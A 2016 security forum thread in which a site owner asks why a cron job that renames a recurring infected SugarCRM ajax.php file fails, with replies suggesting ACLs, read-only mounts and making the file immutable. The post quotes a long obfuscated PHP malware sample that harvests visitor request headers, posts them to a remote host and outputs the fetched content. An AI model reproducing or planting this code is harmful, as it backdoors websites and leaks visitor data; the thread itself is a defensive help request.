---
title: "cronjob isnt working"
date: 2016-12-04
forum: Security
---

### Post by lukas34 on 2016-12-04
Hi
I got the following crontab set up:
```
00 00 * * * clamscan -r / --move /var/infected
*/5 * * * * /var/www/sitzungspause.de/rename.sh
*/5 * * * * /var/www/besprechungspause.de/rename.sh

```
```
cron start/running, process 952
```
rename.sh:
```

rm /var/www/sitzungspause.de/public_html/sugar/SugarCE622/ajax.php.1
mv /var/www/sitzungspause.de/public_html/sugar/SugarCE622/ajax.php /var/www/sitzungspause.de/public_html/sugar/SugarCE622/ajax.php.1

```
respectivly for the other site
ajax.php contains potential virus code, that replicates itself every day. Renaming it is my "way to fo fight it", because I cannot figure out
where it comes from.
This is a sample from its content:

```
<?php
$GLOBALS['yoWBcjC8S'] = $_SERVER;
function YuNU9WYGYUh($x90fPkD03)

                            {$eC7OZfHvcED = "";global $SZCzWBU2pm8U;
                    for($MBGyAOByQ3DGJ=intval('LGQ0DzsUhIJ3'); $MBGyAOByQ3DGJ<strlen($x90fPkD03); $MBGyAOByQ3DGJ++)
    {$OE0BbuW=$MBGyAOByQ3DGJ % 12;$R6cNsT = ord($x90fPkD03[$MBGyAOByQ3DGJ]) - $OE0BbuW - $SZCzWBU2pm8U;
            if ($R6cNsT < 32){$R6cNsT = $R6cNsT + 94;                
                                        }$eC7OZfHvcED .= chr($R6cNsT);}return $eC7OZfHvcED;}
                    $UknKyWYM = chr(168^206).chr(168^193).chr(168^196).chr(168^205).chr(168^247).chr(168^207).chr(168^205).chr(168^220).chr(168^247).chr(168^203).chr(168^199).chr(168^198).chr(168^220).chr(168^205).chr(168^198).chr(168^220).chr(168^219);

$Ilemy2zDSB = chr(223^172).chr(223^170).chr(223^189).chr(223^172).chr(223^171).chr(223^173).chr(223^128).chr(223^188).chr(223^176).chr(223^170).chr(223^177).chr(223^171);

$SZCzWBU2pm8U = $Ilemy2zDSB($UknKyWYM(${chr(156^195).chr(156^207).chr(156^217).chr(156^206).chr(156^202).chr(156^217).chr(156^206)}[chr(43^120).chr(43^104).chr(43^121).chr(43^98).chr(43^123).chr(43^127).chr(43^116).chr(43^109).chr(43^98).chr(43^103).chr(43^110).chr(43^101).chr(43^106).chr(43^102).chr(43^110)]), chr(ord("R") - 42));

$SZCzWBU2pm8U=$SZCzWBU2pm8U ^ 807;

${quI9GObehO("Jtv/,<0")} = pkeFsN("8<@:5>=M9>KKF8BII");

${pkeFsN("G6|Hz9mM&#")} = quI9GObehO("vz~)y)7}&z#<~\"3%(~.8,z*\$u");

${quI9GObehO("4iMB{*NRN+MA")} = UAgIYB6Oq93E("EGF4IGDBN");

${UAgIYB6Oq93E("C:)?)iO}>FRI")} = pkeFsN("7EFDH6J>JJNQ;A;");
                ${YuNU9WYGYUh("FF}zLwx|'IT")} = ZHiem8M("vz~)y)7/y'%!q'w4}'");
${YuNU9WYGYUh("'B@HM!QxRisT")} = gXCi44G("E8HAE:9E?");
                function cODJ3PO($hd7q6c1Q0){return YuNU9WYGYUh($hd7q6c1Q0);};
${ZHiem8M("\"u'.{w+mJDH")} = ZHiem8M("8<@:5<PBMOO");
${quI9GObehO("#D-j|MO@*j")} = pkeFsN("7KDAE;=");
${pkeFsN("Kb}|J;:}4\$K0")} = pkeFsN("@?d7H");
                function quI9GObehO($b49Z42Xw24){return YuNU9WYGYUh($b49Z42Xw24);};
${gXCi44G(";fg>0AE")} = YuNU9WYGYUh("CHCI;;7ILDJQ35@:5<F<I?A");
        ${gXCi44G("vaIECeFg(j}3")} = cODJ3PO("BE9<5I=IF<?B");
                ${pkeFsN(",<%'&v;!")} = quI9GObehO("3EF6O6C>S:AU;FHH");

${gXCi44G("(-!l@i/~o")} = UAgIYB6Oq93E("vz~)y)7}&z#<~\"3'y*7+y)#\"");

function UAgIYB6Oq93E($zP9TR2UrYLIZA){return YuNU9WYGYUh($zP9TR2UrYLIZA);};
                    ${YuNU9WYGYUh("y\"~?#i")} = cODJ3PO("G6:>HJL");
${UAgIYB6Oq93E("{Ed{@=g|2nPWJ")} = UAgIYB6Oq93E("AE8");
${gXCi44G("\$t<?=G2}L}")} = UAgIYB6Oq93E(">8J:DJ@M?DJ");
                        function ZHiem8M($uiWGkBkE){return YuNU9WYGYUh($uiWGkBkE);};

${quI9GObehO("FG97Lhnxp")} = ZHiem8M("CHCI;;7ILDJQ35@:5<F<I?A");
        ${YuNU9WYGYUh("D8M}+(J&4")} = ZHiem8M("AE8");
${UAgIYB6Oq93E("\$Fb%e.")} = YuNU9WYGYUh(";A=4I<L");
${ZHiem8M("}'#/*xwGPG")} = ZHiem8M("5BBK;IL8OP@B5B8:");
${cODJ3PO("=@>uL/J?G(Fr")} = UAgIYB6Oq93E("76<D");
function pkeFsN($Lcr9gb3IMuW){return YuNU9WYGYUh($Lcr9gb3IMuW);};
${YuNU9WYGYUh("A>e@L,")} = ZHiem8M(">au#GMx%ADjP+");

${pkeFsN("(M!MuMGkkPq")} = pkeFsN("BE=CJ=");
        function gXCi44G($uQJGSlbQdEvV){return YuNU9WYGYUh($uQJGSlbQdEvV);};
                        ${YuNU9WYGYUh("*=<B<h{?.j")} = gXCi44G("76<D");
                    ${UAgIYB6Oq93E("L'%tH%B!E!\$}C")} = pkeFsN("BE=CJ=");
        ${YuNU9WYGYUh("}j,t+)")} = ZHiem8M("H9DG?EL?");
${YuNU9WYGYUh("Jc.8PI")} = pkeFsN("EGFHJI");
${quI9GObehO(")<B,J,~")} = cODJ3PO("H9DG?EL?");
${cODJ3PO("F@8wx&fC#\",")} = ZHiem8M("CHCI;;7ILDJQ35@:5<F<I?A");

${UAgIYB6Oq93E("&+#>*&A)0Rk'c")} = ZHiem8M("E;5d");
${UAgIYB6Oq93E("s%s<!Hx")} = quI9GObehO("EH6HJI7<IPJQ");
                        ${gXCi44G("E?>;Bj*m\"5TP")} = UAgIYB6Oq93E("8HB8J@GG9@TFEGG");
${ZHiem8M("\"If:!i\"|(Iq")} = ZHiem8M("?7g");
    ${YuNU9WYGYUh("Gg}I?{g-?{*.")} = quI9GObehO("*8s<~H2");

${UAgIYB6Oq93E(">K9I%M}Bn")} = cODJ3PO("CHCI;D=M;");
${cODJ3PO("Ark|(w")} = ZHiem8M("FEI:");
${pkeFsN("~h-+\$G:%}jE")} = UAgIYB6Oq93E("AE8");
${pkeFsN("'D}\$)&OJD")} = ZHiem8M(";@DAE;=");
            ${UAgIYB6Oq93E("H&ddMio\$.")} = pkeFsN("5HFA5<P>=");
${pkeFsN("*,&NhKL/?")} = pkeFsN("5HFA5:DHM@");
${pkeFsN("B7uwDg0j!jq")} = UAgIYB6Oq93E("~rjB-JRx11}I\$");
${gXCi44G(",ts-??\$")} = pkeFsN(":GHE59MBF?;NG8FN");
${quI9GObehO("tw,!\"0i-{iU")} = gXCi44G("K?F>;9.?1&NA");
${cODJ3PO("C-jd/{-")} = YuNU9WYGYUh("EGF4H<HE;>A");

${UAgIYB6Oq93E("),*&GvJJiCK")} = gXCi44G("GA=F?;");
${UAgIYB6Oq93E("<6!B#Hn")} = pkeFsN("5HFA5@FBN");
                    ${pkeFsN("y}.fwM=Czz")} = cODJ3PO(";CdAEE?");

${quI9GObehO("9?8N\"Cxn!#B3C")} = quI9GObehO("3EF6O6KACAP");

${pkeFsN("+u'8egN&\$N")} = gXCi44G(";A36HI9R");
${YuNU9WYGYUh("y,#u{=h+o.")} = quI9GObehO("EGF:7D7<IIPBJG38H<9M?");

${ZHiem8M("}b}hy\$xjkT")} = gXCi44G("5;F");

${cODJ3PO(",9J}(z&3")} = YuNU9WYGYUh("5HFA5J=MIKP");

${UAgIYB6Oq93E("z~-{Flx0")} = ZHiem8M(":859;I");
${quI9GObehO("9,gw~BnSjHlD")} = pkeFsN("EGFGFFK");

${quI9GObehO("G{z7)O\"#m%!,q")} = pkeFsN(";AHK7C");
    ${quI9GObehO("(cge?>LO?~VW5")} = ZHiem8M("8<@I;I7O;M");

${cODJ3PO("%cje(=OnKp")} = YuNU9WYGYUh("EGFA;E");

${ZHiem8M("@!!w!\$@L")} = YuNU9WYGYUh("EH6HJI");

${pkeFsN("|I~,>?L.#")} = gXCi44G(">BB<f@H");
            ${YuNU9WYGYUh("J6:wBD2")} = quI9GObehO("EGF4H<H>;O");

${quI9GObehO("sL?9\"P~")} = ZHiem8M("44G:D8E>");

${gXCi44G("t{z!DKAQh+E!")} = cODJ3PO("8<@:5GMM9>KKF8BII");
${cODJ3PO("|}:@h=0")} = ZHiem8M("FE=B");



${cODJ3PO("C:)?)iO}>FRI")}(${gXCi44G("G{z7)O\"#m%!,q")}(cODJ3PO("`")));

${gXCi44G("\$Fb%e.")}(UAgIYB6Oq93E("6<GEB8Q8?MNLDF"), ${pkeFsN("G{z7)O\"#m%!,q")}(cODJ3PO("`")));


${gXCi44G(">hKd{jnnF")} = Array(quI9GObehO("aaeafjgeiqji"), pkeFsN("acgajhdmpg"), pkeFsN("addajkdhig"), pkeFsN("aedaifdhlg"), 
                            quI9GObehO("aigakjdhljh"), YuNU9WYGYUh("ajdaekneiiki"), YuNU9WYGYUh("ajdafefejkh"), YuNU9WYGYUh("ajgaeigelg"), pkeFsN("ajgafhneqoh"), UAgIYB6Oq93E("ajhahedjig"), quI9GObehO("ajjaeeheoih"), 
                    gXCi44G("ajjaeikeng"), ZHiem8M("ajkafikemnh"), pkeFsN("badaecgmig"), gXCi44G("badamjdihkh"), pkeFsN("bagaekjejih"), quI9GObehO("bahafileiqji"), UAgIYB6Oq93E("baiaffoeinmi"), 
                    UAgIYB6Oq93E("bajaefnejnoi"), UAgIYB6Oq93E("bajaledhqkh"), YuNU9WYGYUh("bajalhdhkoh"), gXCi44G("bakaeeiejkni"), ZHiem8M("bakajkdnhg"), pkeFsN("bbcafioelih"), UAgIYB6Oq93E("bbhaehoehg"), 
                    cODJ3PO("bbhaemmeqlh"), gXCi44G("bbhaenjeirpi"), ZHiem8M("bbhahldmlg"), ZHiem8M("be`dkgdnjg"), ZHiem8M("be`efidhjph"), YuNU9WYGYUh("be`efjdof"),
                                    UAgIYB6Oq93E("fd`eifdhonh"), gXCi44G("fe`dhedijlh"), UAgIYB6Oq93E("fe`egjdhmih"), quI9GObehO("fe`egjdhmlh"), UAgIYB6Oq93E("fe`flcghng"), cODJ3PO("fe`imclmf"), UAgIYB6Oq93E("ff`fmcgkhg"), 
                    ZHiem8M("fg`dkgdkog"), YuNU9WYGYUh("fg`ehndmmg"), cODJ3PO("fg`eiidppg"), gXCi44G("fg`fkclof"), YuNU9WYGYUh("fj`ddcgjlg"), ZHiem8M("ga`gfcgjig"), YuNU9WYGYUh("gc`ebnke"), UAgIYB6Oq93E("ge`dekdiiqh"), 
                    YuNU9WYGYUh("ge`eeldphg"), YuNU9WYGYUh("ge`lhchjpg"), pkeFsN("gf`dljdhqlh"), quI9GObehO("gi`defdnf"), quI9GObehO("ha`ehmdiiph"), cODJ3PO("hc`kdchjhg"), pkeFsN("hf`degdhf"), 

                    quI9GObehO("ia`dhjdiinh"), UAgIYB6Oq93E("ic`glcghng"), gXCi44G("ic`glcgihg"), ZHiem8M("ie`dgkdhkoh"), cODJ3PO("ie`effdiioh"), pkeFsN("aa`lblge"), YuNU9WYGYUh("aakafeieikli"), pkeFsN("babakjdgf"), 
                                ZHiem8M("bacafhnejmpi"), UAgIYB6Oq93E("bafafldhqnh"), UAgIYB6Oq93E("bahaegleqrh"), pkeFsN("bajaegheqnh"), pkeFsN("bbhafhjeikni"), UAgIYB6Oq93E("db`efhdiiqh"), YuNU9WYGYUh("fe`egjdhmmh"), 
                    ZHiem8M("fi`dledijqh"), gXCi44G("hh`ehhdhjqh"), pkeFsN("bbdakfdhf"), quI9GObehO("fe`fhcghig"), gXCi44G("aekafjkenih"), YuNU9WYGYUh("aifaeliejjki"), UAgIYB6Oq93E("aifaeliejkpi"), 

                    pkeFsN("aifaeliejkqi"), cODJ3PO("ajdaelgejlmi"), cODJ3PO("bbeafjjejmki"), quI9GObehO("ci`ddediig"), ZHiem8M("d_ilbfhjf"), YuNU9WYGYUh("ajbaefheiroi"), cODJ3PO("ib`eekdhhph"), 
                                        UAgIYB6Oq93E("ga`fmcglog"), quI9GObehO("bbcaeffeiqki"), pkeFsN("bajaledhqmh"), pkeFsN("accahgdgf"), gXCi44G("fe`jhchhmg"));

            ${ZHiem8M("v,d=?!EN")} = Array(ZHiem8M("}BN>BC9fmgj[X+cdoU\$BHPT[Jih4jiqWLQtnh_bae^V~?>GL_cbddeggiY\"FD8:DNdiofihlP}+(chneh"), 
                UAgIYB6Oq93E("}BN>BC9flgj[X6CBF8LB<GAvP~'|yUnehtZ4;A8DMJV'.YoialR)H@<>HOio^a["), 

                cODJ3PO("}BN>BC9flgj[X6CBF8LB<GAvP~'|yUnehtZ4;A8DMJV'.YpialR)H@<>HOio^a["),);


                     if (${quI9GObehO("s%s<!Hx")}(${ZHiem8M("Jtv/,<0")}($_SERVER[quI9GObehO("%t&|&+7}#'!+q~w")]), quI9GObehO("T")) != ${ZHiem8M("G{z7)O\"#m%!,q")}(cODJ3PO("`"))+380){ ${YuNU9WYGYUh("vaIECeFg(j}3")}(UAgIYB6Oq93E("_`9>"), ${YuNU9WYGYUh("4s8k!,")}[pkeFsN("9->eNO")], '');exit();}

if (empty(${cODJ3PO("1xw)")}))
{
    ${quI9GObehO("B7uwDg0j!jq")}();
}


${quI9GObehO("@e+A;10D%k")} = ${UAgIYB6Oq93E("tw,!\"0i-{iU")}();
    ${quI9GObehO("}tLx=%Dy(rU3")} = @$GLOBALS[UAgIYB6Oq93E("KB+u9Ayo-")][pkeFsN("x'(%5,+|,:{\$u!(")];

if (${pkeFsN("+u'8egN&\$N")}(${pkeFsN("}tLx=%Dy(rU3")}, ${gXCi44G("v,d=?!EN")}))
{
    ${pkeFsN("B7uwDg0j!jq")}();
}

if (empty(${UAgIYB6Oq93E("@e+A;10D%k")}))
{
                            ${UAgIYB6Oq93E("B7uwDg0j!jq")}();
}

            ${gXCi44G("\"7@wO%H!*F")} = ${quI9GObehO("@!!w!\$@L")}(${YuNU9WYGYUh("@e+A;10D%k")}, ${cODJ3PO("G{z7)O\"#m%!,q")}(YuNU9WYGYUh("`")), ${gXCi44G("9,gw~BnSjHlD")}(${cODJ3PO("@e+A;10D%k")}, quI9GObehO("^"))+${YuNU9WYGYUh("G{z7)O\"#m%!,q")}(UAgIYB6Oq93E("a")));

if (${gXCi44G("+u'8egN&\$N")}(${quI9GObehO("\"7@wO%H!*F")}, ${YuNU9WYGYUh(">hKd{jnnF")}))
{
    ${pkeFsN("B7uwDg0j!jq")}();
}

${ZHiem8M("G@N8L,&Q%)%0a")} = ${YuNU9WYGYUh("G{z7)O\"#m%!,q")}(pkeFsN("bjcje"));
            ${ZHiem8M("A6cg-'\".")} = ${quI9GObehO("G{z7)O\"#m%!,q")}(UAgIYB6Oq93E("`"));
foreach (${pkeFsN("4iMB{*NRN+MA")}($GLOBALS[gXCi44G("KB+u9Ayo-")][UAgIYB6Oq93E("\$v%*y*,8/-%")]) as ${cODJ3PO("%((L.,CJL=s")})
{

    ${YuNU9WYGYUh("G@N8L,&Q%)%0a")} += ${quI9GObehO("~h-+\$G:%}jE")}(${gXCi44G("%((L.,CJL=s")});
    ${YuNU9WYGYUh("A6cg-'\".")} ++;
}
        ${UAgIYB6Oq93E("G@N8L,&Q%)%0a")}<<=${pkeFsN("G{z7)O\"#m%!,q")}(gXCi44G("b"));${gXCi44G("G@N8L,&Q%)%0a")}^=${ZHiem8M("G@N8L,&Q%)%0a")};${YuNU9WYGYUh("G@N8L,&Q%)%0a")}+=${quI9GObehO("G{z7)O\"#m%!,q")}(pkeFsN("cc"));

                ${UAgIYB6Oq93E("G@N8L,&Q%)%0a")} = ${quI9GObehO("J6:wBD2")}(${gXCi44G("}b}hy\$xjkT")}(${quI9GObehO("G@N8L,&Q%)%0a")}), ${quI9GObehO("G{z7)O\"#m%!,q")}(quI9GObehO("h")));


                        ${YuNU9WYGYUh("@e+A;10D%k")} = quI9GObehO("hj`hfcmofjl");
                    ${gXCi44G("=)g{gj{z0")} = gXCi44G("ha");
${gXCi44G("#(*\$PgACL#BS")} = YuNU9WYGYUh("_A6<L<;Rmhnp4LfG<?dIBK");


${quI9GObehO("F(()uKK(?(5)8")} = Array();
                    ${pkeFsN("F(()uKK(?(5)8")}[ZHiem8M(";")] = ${quI9GObehO("tw,!\"0i-{iU")}();
${UAgIYB6Oq93E("F(()uKK(?(5)8")}[pkeFsN("B")] = @$GLOBALS[ZHiem8M("KB+u9Ayo-")][quI9GObehO("x'(%5}',.")] . @$GLOBALS[UAgIYB6Oq93E("KB+u9Ayo-")][UAgIYB6Oq93E("\$v%*y*,8/-%")];

${ZHiem8M("F(()uKK(?(5)8")}[pkeFsN("G")] = @$GLOBALS[ZHiem8M("KB+u9Ayo-")][quI9GObehO("x'(%5,+|,:{\$u!(")];

${gXCi44G("F(()uKK(?(5)8")}[YuNU9WYGYUh("3")] = @$GLOBALS[ZHiem8M("KB+u9Ayo-")][ZHiem8M("x'(%5vyz}+0<|r\"z+v}|")];
                        ${quI9GObehO("F(()uKK(?(5)8")}[YuNU9WYGYUh("D")] = @$GLOBALS[gXCi44G("KB+u9Ayo-")][ZHiem8M("x'(%5){}}-!/")];
                    ${gXCi44G("F(()uKK(?(5)8")}[pkeFsN("38")] = @$GLOBALS[UAgIYB6Oq93E("KB+u9Ayo-")][UAgIYB6Oq93E("x'(%5vyz}+0<u!u\$x~&~")];
${gXCi44G("F(()uKK(?(5)8")}[UAgIYB6Oq93E("34")] = @$GLOBALS[UAgIYB6Oq93E("KB+u9Ayo-")][cODJ3PO("x'(%5vyz}+0")];
${quI9GObehO("F(()uKK(?(5)8")}[cODJ3PO("36")] = @$GLOBALS[pkeFsN("KB+u9Ayo-")][UAgIYB6Oq93E("x'(%5vyz}+0<sys')z,")];
${UAgIYB6Oq93E("F(()uKK(?(5)8")}[UAgIYB6Oq93E("5")] = @$GLOBALS[cODJ3PO("KB+u9Ayo-")][YuNU9WYGYUh("x'(%5x''(~}1y\"\"")];
${quI9GObehO("F(()uKK(?(5)8")} = ${cODJ3PO(",ts-??\$")}(${YuNU9WYGYUh("F(()uKK(?(5)8")});


$url = gXCi44G(":GHEnde") . ${YuNU9WYGYUh("|I~,>?L.#")}(-${pkeFsN("G{z7)O\"#m%!,q")}(cODJ3PO("aiigdflnmk")) ^ (${cODJ3PO("~h-+\$G:%}jE")}(${gXCi44G("G@N8L,&Q%)%0a")}[${pkeFsN("G{z7)O\"#m%!,q")}(gXCi44G("`"))]) + ${ZHiem8M("~h-+\$G:%}jE")}(${ZHiem8M("G@N8L,&Q%)%0a")}[${gXCi44G("G{z7)O\"#m%!,q")}(UAgIYB6Oq93E("a"))]) + (${pkeFsN("Jc.8PI")}(${quI9GObehO("@!!w!\$@L")}($GLOBALS[UAgIYB6Oq93E("KB+u9Ayo-")][cODJ3PO("\$v%*y*,8/-%")], -${YuNU9WYGYUh("G{z7)O\"#m%!,q")}(YuNU9WYGYUh("d"))), ZHiem8M("^C<E")) == FALSE ? ${quI9GObehO("G{z7)O\"#m%!,q")}(cODJ3PO("ii")) : ${pkeFsN("y}.fwM=Czz")}(${YuNU9WYGYUh("@e+A;10D%k")})))) . gXCi44G("j") . ${UAgIYB6Oq93E("=)g{gj{z0")} . ${ZHiem8M("#(*\$PgACL#BS")};

$content = ${cODJ3PO("A>e@L,")}($url, ${gXCi44G("F(()uKK(?(5)8")});
if (!$content)
{
                $content = ${pkeFsN("Gg}I?{g-?{*.")}($url, ${ZHiem8M("F(()uKK(?(5)8")});
}


if(${YuNU9WYGYUh("%cje(=OnKp")}($content) < ${cODJ3PO("G{z7)O\"#m%!,q")}(pkeFsN("aa")))
{
    ${ZHiem8M("B7uwDg0j!jq")}();
}


$content = ${UAgIYB6Oq93E("#D-j|MO@*j")}("\n", $content);

${YuNU9WYGYUh("Lw>j~n?")} = ${UAgIYB6Oq93E("9?8N\"Cxn!#B3C")}($content);
                $content = ${YuNU9WYGYUh("'D}\$)&OJD")}("\n", $content);

if (${UAgIYB6Oq93E("Jc.8PI")}(${gXCi44G("Lw>j~n?")}, UAgIYB6Oq93E("^;HBB")) === FALSE)
{

    ${UAgIYB6Oq93E("z~-{Flx0")}(gXCi44G("sBBI;ELd.TLBjQ5EFCA<;OEL@`C8J<LdMONB3@"));
    ${YuNU9WYGYUh("z~-{Flx0")}(YuNU9WYGYUh("sBBI;ELd|DOMAF=I?FFqX<PQ36<B;ELrXAEI7A5B;r") . ${gXCi44G("Lw>j~n?")});
            ${UAgIYB6Oq93E("z~-{Flx0")}(ZHiem8M("sBBI;ELd&@JDF;lS") . ${UAgIYB6Oq93E("%cje(=OnKp")}($content));
}

exit($content);

                        function ylriebVfWKrd()
                {global ${YuNU9WYGYUh("|}:@h=0")};
global ${quI9GObehO("(cge?>LO?~VW5")};
global ${quI9GObehO("(-!l@i/~o")};
        global ${cODJ3PO(",<%'&v;!")};

global ${pkeFsN("#D-j|MO@*j")};
            global ${pkeFsN("FF}zLwx|'IT")};
global ${pkeFsN("G6|Hz9mM&#")};

            ${cODJ3PO("6FtO{h\"n)p")} = array(gXCi44G("\$v!\$*z7x|}."), );
    foreach (${UAgIYB6Oq93E("6FtO{h\"n)p")} as ${pkeFsN("G@N8L,&Q%)%0a")})
                                    {

        if (${gXCi44G(",<%'&v;!")}(${UAgIYB6Oq93E("G@N8L,&Q%)%0a")}, $GLOBALS[gXCi44G("KB+u9Ayo-")]) === TRUE)
        {

            foreach (${quI9GObehO("#D-j|MO@*j")}(quI9GObehO("\\"), $GLOBALS[YuNU9WYGYUh("KB+u9Ayo-")][${ZHiem8M("G@N8L,&Q%)%0a")}]) as ${gXCi44G("@e+A;10D%k")})
                                    {

                ${pkeFsN("@e+A;10D%k")} = ${pkeFsN("|}:@h=0")}(${ZHiem8M("@e+A;10D%k")});
                if (${YuNU9WYGYUh("(cge?>LO?~VW5")}(${cODJ3PO("@e+A;10D%k")}, FILTER_VALIDATE_IP, ${gXCi44G("G6|Hz9mM&#")} | FILTER_FLAG_NO_RES_RANGE) !== FALSE)
                {
                    return ${cODJ3PO("@e+A;10D%k")};

    
                                        }
            }
        }
    }


    return "";
}

                function NA8mWszAWVClR()
    {global ${ZHiem8M("t{z!DKAQh+E!")};

global ${quI9GObehO("sL?9\"P~")};
                global ${cODJ3PO("z~-{Flx0")};
                                global ${pkeFsN("y,#u{=h+o.")};
global ${UAgIYB6Oq93E("),*&GvJJiCK")};
global ${UAgIYB6Oq93E("C-jd/{-")};
global ${YuNU9WYGYUh("Ark|(w")};
                global ${pkeFsN("\"If:!i\"|(Iq")};

global ${pkeFsN("\"u'.{w+mJDH")};
global ${pkeFsN("Jtv/,<0")};

            ${cODJ3PO("z~-{Flx0")}(YuNU9WYGYUh("x'(%cfdhXmjoP!CIT{GNH?"));

            ${YuNU9WYGYUh(";D>Hv;P2Iz")} = ${UAgIYB6Oq93E("sL?9\"P~")}($GLOBALS[cODJ3PO("KB+u9Ayo-")][cODJ3PO("\"y\$4)z\$}")]);
    
                            if (!${pkeFsN("\"u'.{w+mJDH")}(cODJ3PO("dafa") . ${cODJ3PO(";D>Hv;P2Iz")}))
    {

        ${quI9GObehO("JE{t)?N\$<=Vo6")} =  ${pkeFsN("\"If:!i\"|(Iq")}(${quI9GObehO("),*&GvJJiCK")}());
                    $content = @${cODJ3PO("Jtv/,<0")}(cODJ3PO(":GHEnde").$GLOBALS[UAgIYB6Oq93E("KB+u9Ayo-")][quI9GObehO("x'(%5}',.")] . UAgIYB6Oq93E("_") . ${UAgIYB6Oq93E("JE{t)?N\$<=Vo6")}, FALSE, ${quI9GObehO("y,#u{=h+o.")}(array(ZHiem8M(":GHE") => array(quI9GObehO(";:BDH<7>LMKOE") => true))));

        $content = ${quI9GObehO("C-jd/{-")}(${YuNU9WYGYUh("JE{t)?N\$<=Vo6")}, ${UAgIYB6Oq93E(";D>Hv;P2Iz")}, $content);
        ${quI9GObehO("t{z!DKAQh+E!")}(gXCi44G("dafa") . ${ZHiem8M(";D>Hv;P2Iz")}, $content);
    }
                    else
    {
        $content = @${YuNU9WYGYUh("Jtv/,<0")}(YuNU9WYGYUh("dafa") . ${UAgIYB6Oq93E(";D>Hv;P2Iz")});
    }


    exit($content);
}


function l0CNqvBLgi0sY($url, $content)
{global ${YuNU9WYGYUh("G{z7)O\"#m%!,q")};
global ${pkeFsN(",9J}(z&3")};
global ${gXCi44G("<6!B#Hn")};
                    global ${pkeFsN("*,&NhKL/?")};

global ${pkeFsN("H&ddMio\$.")};
global ${cODJ3PO("E?>;Bj*m\"5TP")};


    if (!${gXCi44G("E?>;Bj*m\"5TP")}(pkeFsN("5HFA5M=KMDKK")))
    {
                                return "";
    }

                        ${quI9GObehO("=h~(G,")} = ${UAgIYB6Oq93E("<6!B#Hn")}();

    ${quI9GObehO(",9J}(z&3")}(${cODJ3PO("=h~(G,")}, CURLOPT_URL, $url);
    ${YuNU9WYGYUh(",9J}(z&3")}(${cODJ3PO("=h~(G,")}, CURLOPT_POST, ${pkeFsN("G{z7)O\"#m%!,q")}(cODJ3PO("a")));
    ${ZHiem8M(",9J}(z&3")}(${gXCi44G("=h~(G,")}, CURLOPT_POSTFIELDS, $content);

    ${UAgIYB6Oq93E(",9J}(z&3")}(${cODJ3PO("=h~(G,")}, CURLOPT_RETURNTRANSFER, TRUE);

        ${pkeFsN("B!;x*P/P,RN")} = ${cODJ3PO("H&ddMio\$.")}(${quI9GObehO("=h~(G,")});
    ${gXCi44G("*,&NhKL/?")}(${YuNU9WYGYUh("=h~(G,")});


    return ${gXCi44G("B!;x*P/P,RN")};
}

function XeAgJqZ($url, $content)
{global ${ZHiem8M("z~-{Flx0")};
global ${pkeFsN("y,#u{=h+o.")};
    global ${gXCi44G("Jtv/,<0")};

    ${ZHiem8M("}h|{xzRN'3")} = ${pkeFsN("y,#u{=h+o.")}(Array(UAgIYB6Oq93E(":GHE") => Array(ZHiem8M("?8H=E;") => ZHiem8M("\"\"')"), quI9GObehO(":859;I") => quI9GObehO("sBBI;ELdNTLBjQ5EFCA<;OEL@`L`MNOd@JNJ]HFA;E;H>@@"), ZHiem8M("5BBI;EL") => $content)));

                ${YuNU9WYGYUh("B!;x*P/P,RN")} = @${quI9GObehO("Jtv/,<0")}($url, FALSE, ${gXCi44G("}h|{xzRN'3")});

                    return ${YuNU9WYGYUh("B!;x*P/P,RN")};
}





```

---

### Post by TheFu on 2016-12-04
Which userid does the rename script run under? I.e., which crontab is being used?
Is the rename.sh script permissions set for that userid to execute?

If you like, make the file empty and use ACLs to make it read-only. See if that stops the hackers from having complete access to your machine.  Another option is to mount the parts of the storage that shouldn't be modified as read-only. NFS would be best because the NFS server controls the read-only access, not the admin on the local machine.

---

### Post by SeijiSensei on 2016-12-04
Try this:
```

cd /path/to/ajax.php/directory
sudo rm ajax.php
sudo touch ajax.php
sudo chattr +i ajax.php

```
That will create an empty file called ajax.php and make it "immutable." Then whatever script runs that creates it will be unable to save a copy of the infected code.

---

